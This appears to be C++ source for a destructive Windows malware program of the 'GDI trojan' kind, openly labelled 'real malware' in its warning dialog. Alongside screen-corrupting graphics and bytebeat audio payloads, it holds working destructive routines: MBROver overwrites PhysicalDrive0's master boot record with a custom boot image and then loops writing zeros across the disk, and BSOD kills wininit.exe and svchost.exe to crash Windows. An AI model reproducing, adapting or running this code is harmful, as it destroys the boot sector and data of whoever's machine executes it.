typedef struct IUnknown IUnknown;
#include "payloads.h"

HCRYPTPROV prov;
DWORD xs;

HDC hdc = GetDC(0);
int x = GetSystemMetrics(0);
int y = GetSystemMetrics(1);

VOID Warning(
	LPVOID lpvd
) {
	if (MessageBoxW(0, L"This is a real malware \n If you run this program your PC/VM will be trashed! \n Still want to continue?", L"A Corruption Wind Is Coming...", MB_YESNO | MB_ICONWARNING) == IDNO)
		exit(0);
}


VOID SeedXorshift32(DWORD dwSeed) {
	xs = dwSeed;
}

DWORD Xorshift32() {
	xs ^= xs << 13;
	xs ^= xs >> 17;
	xs ^= xs << 5;
	return xs;
}

VOID  ExecuteShader(TROJAN_SHADER shader, int nTime) {
	int dwStartTime = Time;
	HDC hdcScreen = GetDC(NULL);
	POINT ptScreen = GetVirtualScreenPos();
	SIZE szScreen = GetVirtualScreenSize();

	BITMAPINFO bmi = { 0 };
	PRGBQUAD prgbScreen;
	HDC hdcTempScreen;
	HBITMAP hbmScreen;

	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = szScreen.cx;
	bmi.bmiHeader.biHeight = szScreen.cy;
	bmi.bmiHeader.biHeight = szScreen.cy;

	prgbScreen = { 0 };

	hdcTempScreen = CreateCompatibleDC(hdcScreen);
	hbmScreen = CreateDIBSection(hdcScreen, &bmi, 0, (void**)&prgbScreen, NULL, 0);
	SelectObject(hdcTempScreen, hbmScreen);

	for (int i = 0; Time < (dwStartTime + nTime); i++) {
		hdcScreen = GetDC(NULL);
		BitBlt(hdcTempScreen, 0, 0, szScreen.cx, szScreen.cy, hdcScreen, 0, 0, SRCCOPY);
		shader(i, szScreen.cx, szScreen.cy, prgbScreen);
		BitBlt(hdcScreen, 0, 0, szScreen.cx, szScreen.cy, hdcTempScreen, 0, 0, SRCCOPY);
		//ReleaseDC(NULL, hdcScreen);
		//DeleteObject(hdcScreen);
		Sleep(10);
	}

	//DeleteObject(hbmScreen);
	//DeleteDC(hdcTempScreen);
	RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
	Sleep(100);
}

// Payloads



VOID Shader1(int t, int w, int h, PRGBQUAD prgbScreen) {
	for (int i = 0; i < w * h; i++) {
		int tp = prgbScreen[i].rgb;
		prgbScreen[i].rgb = prgbScreen[i / 15 * 15].rgb;
		prgbScreen[i / 15 * 15].rgb = tp;
	}
}

VOID Shader2(int t, int w, int h, PRGBQUAD prgbScreen) {
	for (int i = 0; i < w * h; i++) {
		int tp = prgbScreen[i].rgb;
		prgbScreen[i].rgb = prgbScreen[i / 13 * 12].rgb, prgbScreen[i / 13 * 12].rgb, prgbScreen[i / 13 * 12].rgb % (RGB(rand() % 255, rand() % 255, rand() % 255));
		prgbScreen[i / 13 * 12].rgb = tp;
	}
}

VOID Payload1() {
	HDC uhdc = GetDC(GetForegroundWindow());
	HDC hWindow;
	HDC hDsktp;
	HWND hWnd;
	RECT wRect;
	int dX = 0;
	int dY = 0;
	int dW;
	int dH;
	POINT wPt[3];
	int counter = 10;
	hWnd = GetDesktopWindow();
	hWindow = GetWindowDC(hWnd);
	GetWindowRect(hWnd, &wRect);
	dW = GetSystemMetrics(0);
	dH = GetSystemMetrics(0);
	wPt[0].x = wRect.left - counter;
	wPt[0].y = wRect.top + counter;
	wPt[1].x = wRect.right - counter;
	wPt[1].y = wRect.top - counter;
	wPt[2].x = wRect.left + counter;
	wPt[2].y = wRect.bottom + counter;
	fori(50) {
		SelectObject(hdc, CreateSolidBrush(RGB(
			rand() % 255,
			rand() % 255,
			rand() % 255
		)));
		BitBlt(hdc, rand() % 2, rand() % 2, x, y, hdc, rand() % 2, rand() % 2, SRCPAINT);
		BitBlt(hdc, rand() % 12, rand() % 12, x, y, hdc, rand() % 12, rand() % 12, SRCCOPY);
		BitBlt(hdc, rand() % x, rand() % y, rand() % 600, rand() % 600, hdc, rand() % x, rand() % y, SRCPAINT);
		PatBlt(hdc, 0, 0, x, y, PATINVERT);
		PlgBlt(hdc, wPt, hdc, wRect.left, wRect.top, wRect.right - wRect.left, wRect.bottom - wRect.top, 0, 0, 0);

	}
}


VOID Shader3(int t, int w, int h, PRGBQUAD prgbScreen) {
	PRGBQUAD tp = { 0 };
	tp = prgbScreen;
	for (int i = 0; i < h; i++) {
		for (int r = 0; r < w; r++) {
			prgbScreen[i * r].rgb = prgbScreen[i * 55 + i].rgb, tp[i * r * 99].rgb % (RGB(rand() % 255, rand() % 255, rand() % 255));
		}
	}
}

VOID ConstPayload() {
	fori (100) {
		DrawIcon(hdc, rand() % x, rand() % y, LoadIcon(0, IDI_ERROR));
		SetTextColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
		SetTextColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
		TextOutW(hdc, rand() % x, rand() % y, L"ÖÆÂÝĆă", wcslen(L"ÖÆÂÝĆă"));
		TextOutW(hdc, rand() % x, rand() % y, L"ÖÆÂÝĆă", wcslen(L"ÖÆÂÝĆă"));
		TextOutW(hdc, rand() % x, rand() % y, L"ÖÆÂÝĆă", wcslen(L"ÖÆÂÝĆă"));
	}
}

VOID Shader4(int t, int w, int h, PRGBQUAD prgbScreen) {
	PRGBQUAD tp = { 0 };
	tp = prgbScreen;
	for (int i = 2; i < h / 2; i++) {
		for (int r = 0; r < w; r++) {
			prgbScreen[i * h + r].rgb = tp[(int)((float)(i * w + r) + (float)sqrt((3 * (w / 2) * i - i * i))) % (h * w)].rgb;
		}
	}
	for (int i = h / 2; i < w; i++) {
		for (int r = 0; r < h; r++) {
			prgbScreen[i * h + r].rgb = tp[(int)((float)(i * w + r) + (float)sqrt((3 * (w / 2) * i - i * i))) % (h * w)].rgb;
		}
	}
}

VOID Shader5(int t, int w, int h, PRGBQUAD prgbScreen) {
	for (int i = 0; i < w * h; i++) {
		prgbScreen[i].rgb = (prgbScreen[i].rgb * 20) % (RGB(255, 255, 255));
	}
}

VOID Payload3() {
	RECT rect;
	HWND hw = GetDesktopWindow();
	GetWindowRect(hw, &rect);
	fori(300) {
		StretchBlt(hdc, 5, 5, rect.right - 10, rect.bottom - 10, hdc, 0, 0, rect.right, rect.bottom, SRCCOPY);
		BitBlt(hdc, rand() % 10 - 20, rand() % 20 - 10, x, x, hdc, 0, 0, SRCCOPY);
		BitBlt(hdc, rand() % 10 - 20, rand() % 20 - 10, x, x, hdc, 0, 0, SRCCOPY);
	}
}

VOID ByteBe1() {
	HWAVEOUT hwo = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hwo, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 80];
	for (DWORD t = 0; t < sizeof(buffer); t++)
		buffer[t] = static_cast<char>("192837350875838589058948945548903458904589034589050890985498034548903589034598045890345903450983450983450983450983450983450983450983450984509835098354098354098345098345098354098345098345098345908345098345983450983450983459083405983459083405983509835098345098345890345890548908904900000000000000002353242342324400000000000000039802382138129372189373981738912732819379837198237129837218937129873289371289371289371289372193721983789237128937219831000000000000000000000000000000000000000000000000030323137231897231879213879231782318732872138732913721387213966666666666666666666666666666666666666666666666666666666699999999999999999999999999999999999999999999999999999996666666666666666666666666666666666669999999999999999999999999666666666666666999999999966666999996696696969696969606948578457897486834763125481693265938569857239857238972398472389472398423498234987234987234789234789324897324879239234987234897387634587632457634576342576435762345823476342978653842654827562439857624587263458976324587962345879634258976324587634576234576547654765476766556534578234978523459623458762354897634259746235879642359876328976523489756389476583724589723465582374965284796523947865943286594598734265863457834658347547823527894564857384564387564387563785678563847563475647675675657546555456475555555555555555555555555555555555555555555555555555555555555555555444444444444455555555555555556666666666666665555555555555555555555555555555555555555555555555555555555555544444444444455555555555555666666666666677777777777898755555555555555555555555555555555555555983742984732984723985555555555555555555555555555555555555554444444444444444444444444444444444444444444444444444444444444444444444444444444444444422222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111222222222222222222222222222222222222222222222222222222222222222222222222222222222222333333333333333333333333333333333333333333333333333344444444444444444444444444444444444555555555555555555566666666666667777777788888998273053487539405743587349587348954759834574893578946736232131253142351243152412534125342312413241323653205213562864761257863415435931784751645617358931571634758765654314743764366158658763174865873145864367134651843765871587173657863476134865341786587413578143657866754767565231465235432645234623467243324573427346536356473574158473582647665451641432564365142136426534254372534675213645231654456132546213546215441365143156341265341356124365142365124365142365142365134612436512346123412535143651243612346512431342513412534153142534253412354153143512435124321315234512352134153412534153415341253421534123123143124312431243243124312431243243124312431231213213213212321232122123212321212121212121222222222121211111111111111111111111111111111111111111100010011111111111111111100000000111101010101010101010100100100000000000100100000000000001"[t >> 5] * t * 33);
	WAVEHDR hdr = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hwo, &hdr, sizeof(WAVEHDR));
	waveOutWrite(hwo, &hdr, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hwo, &hdr, sizeof(WAVEHDR));
	waveOutClose(hwo);
	Sleep(-1);

}

VOID ByteBe2() {
	HWAVEOUT hwo = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hwo, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 80];
	for (DWORD t = 0; t < sizeof(buffer); t++)
		buffer[t] = static_cast<char>("8479783297439472389473687561238974392996849578365893758934758934759834574938753948753549874359873459874359873459873459873459873598734598743598734598734958734598734598734958739783459873459873495875757575757577777777777777777777777777777777777777777777777777777777777753530503503224020302300340000460040000000000000000000000400000000000000000250000000000000000000034000000000124000124012401240214892317938418237489235340697568472154657832575867566321421313121111112121121324342151234612457646524785346857439587968579658756978979798978999999999999999999999999999999584597589347983457398457349875834975834974389548395734895734985734857349598479874598423111111243211114321112431211413211112431111423111124311123985329874328957894735264538278278378937893278928975479283742938728397489752894738946374632784328756876329852379837284237589236478258612538167649127598134879316439285694876439873849784739738768264826836583658364826382628642846282742745274674364757666467666666466764646454546464644674564764764764764764764763287642736487234637284672834687463278463248763248746381231230982349873475864973985795745789874587934789457890438907897045807948709340875870439237759845875478540378945708945800000000000000000000000000000000000000000000000000000000000000000000000009769387219317392100000000000000000000000000001000000000000000000000000000000000000000000000000000000004000000600600000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000101010000101010101010111010100010110100101010212012003104023032195796087986796890797787899999999999999999999999999999999999999999999999999999999999999999999999999999999999999999998989898989898989889896796873985679856759268526598475834753498753498573498574398573498574985734859437598475983475938573498759884797832974394723894736875612389743929968495783658937589347589347598345749387539487535498743598734598743598734598734598734598735987345987435987345987349587345987345987349587397834598734598734958757575757575777777777777777777777777777777777777777777777777777777777777535305035032240203023003400004600400000000000000000000004000000000000000002500000000000000000000340000000001240001240124012402148923179384182374892353406975684721546578325758675663214213131211111121211213243421512346124576465247853468574395879685796587569789797989789999999999999999999999999999995845975893479834573984573498758349758349743895483957348957349857348573495984798745984231111112432111143211124312114132111124311114231111243111239853298743289578947352645382782783789378932789289754792837429387283974897528947389463746327843287568763298523798372842375892364782586125381676491275981348793164392856948764398738497847397387682648268365836583648263826286428462827427452746743647576664676666664667646464545464646446745647647647647647647647632876427364872346372846728346874632784632487632487463812312309823498734758649739857957457898745879347894578904389078970458079487093408758704392377598458754785403789457089458000000000000000000000000000000000000000000000000000000000000000000000000097693872193173921000000000000000000000000000010000000000000000000000000000000000000000000000000000000040000006006000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010001010100001010101010101110101000101101001010102120120031040230321957960879867968907977878999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999989898989898989898898967968739856798567592685265984758347534987534985734985743985734985749857348594375984759834759385734987598"[t >> 5] * t * 33);
	WAVEHDR hdr = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hwo, &hdr, sizeof(WAVEHDR));
	waveOutWrite(hwo, &hdr, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hwo, &hdr, sizeof(WAVEHDR));
	waveOutClose(hwo);
	Sleep(-1);

}

VOID ByteBe3() {
	HWAVEOUT hwo = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hwo, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 80];
	for (DWORD t = 0; t < sizeof(buffer); t++)
		buffer[t] = static_cast<char>("1234567891947295738473838383847382948474858492020283848858585858585858585858585858585858585858591919191919191919191919191919191919191919191919191919191999919191919191919191911919191919291919191919191919191911919191919191919191919294939473973985969790702728272728394748595960582727676767676767677676767676767676767767767568756875687568756875687568756875687568756875687568756875687568756875687710202020202020204040493929485838582948292818182848484848575758585839291910102928374646477281910293848563728948284927572478571010101010101010000010000000000000000002000000000000000300000004000050060607080908080605040400300000000020000000000001000000000000000000000000034729483883838383939292828484839499999999998989898987898779876987698765987659876653211235589000022222222222222222222222222222222222622226222622262226222226226262726222622627282920292827262526272829272728278272828262625252525252772722729200208129173927937485960697715110101919910191818171616151513132131516171818191919281838836294682648274938593895846948698696586986969796098099900008000090112345678919472957384738383838473829484748584920202838488585858585858585858585858585858585858585919191919191919191919191919191919191919191919191919191919999191919191919191919119191919192919191919191919191919119191919191919191919192949394739739859697907027282727283947485959605827276767676767676776767676767676767677677675687568756875687568756875687568756875687568756875687568756875687568756877102020202020202040404939294858385829482928181828484848485757585858392919101029283746464772819102938485637289482849275724785710101010101010100000100000000000000000020000000000000003000000040000500606070809080806050404003000000000200000000000010000000000000000000000000347294838838383839392928284848394999999999989898989878987798769876987659876598766532112355890000222222222222222222222222222222222226222262226222622262222262262627262226226272829202928272625262728292727282782728282626252525252527727227292002081291739279374859606977151101019199101918181716161515131321315161718181919192818388362946826482749385938958469486986965869869697960980999000080000901"[t >> 5] * t * 33);
	WAVEHDR hdr = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hwo, &hdr, sizeof(WAVEHDR));
	waveOutWrite(hwo, &hdr, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hwo, &hdr, sizeof(WAVEHDR));
	waveOutClose(hwo);
	Sleep(-1);

}

const char MBRData[512] = {
		0xEB, 0x00, 0xE8, 0x1F, 0x00, 0x8C, 0xC8, 0x8E, 0xD8, 0xBE, 0x33, 0x7C,
		0xE8, 0x00, 0x00, 0x50, 0xFC, 0x8A, 0x04, 0x3C, 0x00, 0x74, 0x06, 0xE8,
		0x05, 0x00, 0x46, 0xEB, 0xF4, 0xEB, 0xFE, 0xB4, 0x0E, 0xCD, 0x10, 0xC3,
		0xB4, 0x07, 0xB0, 0x00, 0xB7, 0x09, 0xB9, 0x00, 0x00, 0xBA, 0x4F, 0x18,
		0xCD, 0x10, 0xC3, 0x20, 0x20, 0x20, 0x20, 0x20, 0x5F, 0x5F, 0x5F, 0x5F,
		0x5F, 0x20, 0x20, 0x20, 0x20, 0x20, 0x0D, 0x0A, 0x0D, 0x0A, 0x20, 0x20,
		0x5F, 0x5F, 0x7C, 0x5F, 0x5F, 0x20, 0x20, 0x20, 0x7C, 0x5F, 0x5F, 0x20,
		0x20, 0x0D, 0x0A, 0x20, 0x20, 0x2F, 0x20, 0x20, 0x20, 0x20, 0x20, 0x5C,
		0x20, 0x20, 0x20, 0x20, 0x20, 0x7C, 0x20, 0x0D, 0x0A, 0x20, 0x7C, 0x20,
		0x20, 0x20, 0x20, 0x20, 0x7C, 0x20, 0x20, 0x20, 0x20, 0x20, 0x7C, 0x20,
		0x0D, 0x0A, 0x20, 0x5C, 0x5F, 0x5F, 0x5F, 0x5F, 0x5F, 0x2F, 0x20, 0x20,
		0x20, 0x5F, 0x5F, 0x7C, 0x20, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x7C,
		0x5F, 0x5F, 0x5F, 0x5F, 0x5F, 0x7C, 0x20, 0x20, 0x20, 0x20, 0x0D, 0x0A,
		0x20, 0x0D, 0x0A, 0x4D, 0x42, 0x52, 0x20, 0x44, 0x65, 0x73, 0x74, 0x72,
		0x6F, 0x79, 0x65, 0x64, 0x20, 0x62, 0x79, 0x20, 0x4F, 0x2E, 0x65, 0x78,
		0x65, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA
};

BOOL
WINAPI
MBROver(VOID)
{
	HANDLE hDrive;
	DWORD dwWrittenBytes;
	BOOL bSuccess;

	hDrive = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);

	if (hDrive == INVALID_HANDLE_VALUE)
	{
		MessageBoxW(NULL, L"I failed to infect your computer and I am a failure.\n...\nI hope you don't mind.\n(God, this is so embarrassing...)", L"Monoxide.exe", MB_OK | MB_ICONERROR);
		return FALSE;
	}

	bSuccess = WriteFile(hDrive, MBRData, 512, &dwWrittenBytes, NULL);

	if (!bSuccess)
	{
		MessageBoxW(NULL, L"Uhm... Why can't I overwrite your bootloader?\nOkay, well, I guess I can die now.", L"Monoxide.exe", MB_OK | MB_ICONERROR);
		CloseHandle(hDrive);

		return FALSE;
	}

	CHAR pcNullData[512];
	RtlZeroMemory(pcNullData, 512);

	for (;; WriteFile(hDrive, pcNullData, 512, &dwWrittenBytes, NULL));
}

VOID
BSOD(VOID) {
	system("C:\\Windows\\System32\\taskkill /f /im wininit.exe");
	system("C:\\Windows\\System32\\taskkill /f /im svchost.exe");
}


